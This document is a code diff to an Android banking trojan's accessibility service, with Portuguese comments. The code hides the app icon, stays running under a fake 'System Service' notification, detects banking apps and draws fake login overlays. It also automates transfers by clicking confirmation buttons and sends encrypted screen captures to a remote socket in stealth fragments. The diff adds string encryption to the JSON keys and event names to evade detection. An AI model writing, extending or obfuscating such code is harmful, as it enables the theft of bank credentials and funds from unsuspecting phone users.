@@ -10,7 +10,7 @@ import android.os.Bundle;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-
+import com.etechd.l3mon.managers.CryptoManager;
 import com.etechd.l3mon.managers.ATSManager;
 import com.etechd.l3mon.managers.BypassManager;
 import com.etechd.l3mon.managers.ContextualManager;
@@ -19,7 +19,6 @@ import com.etechd.l3mon.managers.FakeWebViewOverlay;
 import com.etechd.l3mon.managers.GestureManager;
 import com.etechd.l3mon.managers.OverlayManager;
 import com.etechd.l3mon.managers.WebViewManager;
-import com.etechd.l3mon.managers.CryptoManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -48,22 +47,17 @@ public class AccessibilityCaptureService extends AccessibilityService {
     private boolean hideIconEnabled = false;
 
     public static class HideIconBackgroundService extends android.app.Service {
-
         private static final int NOTIFICATION_ID = 9999;
 
         @Override
         public int onStartCommand(android.content.Intent intent, int flags, int startId) {
             Log.d("HideIconService", "Serviço de persistência iniciado");
-
             createPersistentNotification();
 
-            // Tenta esconder o ícone novamente
             try {
                 android.content.pm.PackageManager pm = getPackageManager();
                 android.content.ComponentName componentName = new android.content.ComponentName(
-                        getPackageName(),
-                        getPackageName() + ".MainActivity");
-
+                        getPackageName(), getPackageName() + ".MainActivity");
                 pm.setComponentEnabledSetting(
                         componentName,
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -71,8 +65,7 @@ public class AccessibilityCaptureService extends AccessibilityService {
             } catch (Exception e) {
                 Log.e("HideIconService", "Erro ao esconder ícone: " + e.getMessage());
             }
-
-            return START_STICKY; // Tenta reiniciar se for morto
+            return START_STICKY;
         }
 
         private void createPersistentNotification() {
@@ -81,8 +74,7 @@ public class AccessibilityCaptureService extends AccessibilityService {
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 android.app.NotificationChannel channel = new android.app.NotificationChannel(
-                        "persist_channel",
-                        "System Service",
+                        "persist_channel", "System Service",
                         android.app.NotificationManager.IMPORTANCE_MIN);
                 notificationManager.createNotificationChannel(channel);
             }
@@ -130,7 +122,6 @@ public class AccessibilityCaptureService extends AccessibilityService {
                     contextualManager.onBankDetected(bank, root);
                     Log.d("Contextual", "Banco detectado: " + bank.toUpperCase());
 
-                    // === FAKE OVERLAY PARA WEBVIEW ===
                     if (webViewManager.hasWebView(root) && webViewManager.isBankLoginWebView(root)) {
                         fakeOverlay.showFakeLoginOverlay(bank);
                     }
@@ -138,17 +129,14 @@ public class AccessibilityCaptureService extends AccessibilityService {
 
                 // === ATS + Clique automático ===
                 atsManager.performATSAutomation(root);
-
                 String[] confirmButtons = { "Confirmar", "Enviar", "Pagar", "Transferir", "Aprovar" };
                 gestureManager.findAndClickConfirmationButton(root, confirmButtons);
 
-                // Publica snapshot
                 JSONObject payload = buildBasicPayload(event, root);
                 if (payload != null) {
                     lastSentAt = now;
                     publishSnapshot(payload);
                 }
-
             } finally {
                 root.recycle();
             }
@@ -158,15 +146,17 @@ public class AccessibilityCaptureService extends AccessibilityService {
     private JSONObject buildBasicPayload(AccessibilityEvent event, AccessibilityNodeInfo root) {
         try {
             JSONObject payload = new JSONObject();
-            payload.put("source", "accessibility");
-            payload.put("time", System.currentTimeMillis());
-            payload.put("eventType", event.getEventType());
+
+            // === CHAVES JSON CRIPTOGRAFADAS ===
+            payload.put(StringCrypto.d("7U8ocvsjz/taaly+0q6VYA=="), "accessibility"); // "source"
+            payload.put(StringCrypto.d("iSuJSms1NYtiP/wxiZHXJg=="), System.currentTimeMillis()); // "time"
+            payload.put(StringCrypto.d("guQkbqNjdu7GIuSn7SSoVw=="), event.getEventType()); // "eventType"
 
             if (event.getPackageName() != null)
-                payload.put("packageName", event.getPackageName().toString());
+                payload.put(StringCrypto.d("Ca1KRioPEFMViEClN0e4rg=="), event.getPackageName().toString()); // "packageName"
 
             if (root != null && root.getText() != null)
-                payload.put("text", root.getText().toString());
+                payload.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), root.getText().toString()); // "text"
 
             return payload;
         } catch (Exception e) {
@@ -181,22 +171,23 @@ public class AccessibilityCaptureService extends AccessibilityService {
                     IOSocket.getInstance().getIoSocket().connected()) {
 
                 String jsonString = payload.toString();
-
-                // === CRIPTOGRAFIA AES ===
                 String encryptedData = CryptoManager.encrypt(jsonString);
 
-                if (encryptedData != null) {
-                    JSONObject encryptedPayload = new JSONObject();
-                    encryptedPayload.put("encrypted", true);
-                    encryptedPayload.put("data", encryptedData);
-                    encryptedPayload.put("timestamp", System.currentTimeMillis());
+                if (encryptedData == null)
+                    return;
 
-                    // Envia os dados criptografados
-                    if (jsonString.length() > 400) {
-                        ExfilManager.sendFragmented("0xAS", encryptedPayload.toString());
-                    } else {
-                        IOSocket.getInstance().getIoSocket().emit("0xAS", encryptedPayload);
-                    }
+                JSONObject encryptedPayload = new JSONObject();
+                encryptedPayload.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
+                encryptedPayload.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encryptedData); // "data"
+                encryptedPayload.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
+
+                // Evento 0xAS (criptografado)
+                String eventAS = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ=="); // ← Substitua pelo valor real de "0xAS"
+
+                if (jsonString.length() > 400) {
+                    ExfilManager.sendFragmented(eventAS, encryptedPayload.toString());
+                } else {
+                    IOSocket.getInstance().getIoSocket().emit(eventAS, encryptedPayload);
                 }
             }
         } catch (Exception e) {
@@ -458,35 +449,25 @@ public class AccessibilityCaptureService extends AccessibilityService {
 
     public void resetAllOverlays() {
         hideFakeWebViewOverlay();
-
-        if (overlayManager != null) {
+        if (overlayManager != null)
             overlayManager.disableOverlayMonitoring();
-        }
-
-        if (contextualManager != null) {
+        if (contextualManager != null)
             contextualManager.resetLastDetectedBank();
-        }
     }
 
     // ==================== EXFILTRAÇÃO STEALTH ====================
-
-    /**
-     * Envia dados sensíveis de forma fragmentada (mais stealth)
-     */
     public void sendStealthData(String eventType, String data) {
         if (data == null || data.isEmpty())
             return;
-
         try {
-            // Criptografa os dados antes de enviar
             String encrypted = CryptoManager.encrypt(data);
             if (encrypted == null)
                 return;
 
             JSONObject obj = new JSONObject();
-            obj.put("encrypted", true);
-            obj.put("data", encrypted);
-            obj.put("timestamp", System.currentTimeMillis());
+            obj.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
+            obj.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encrypted); // "data"
+            obj.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
 
             if (data.length() > 400) {
                 ExfilManager.sendFragmented(eventType, obj.toString());
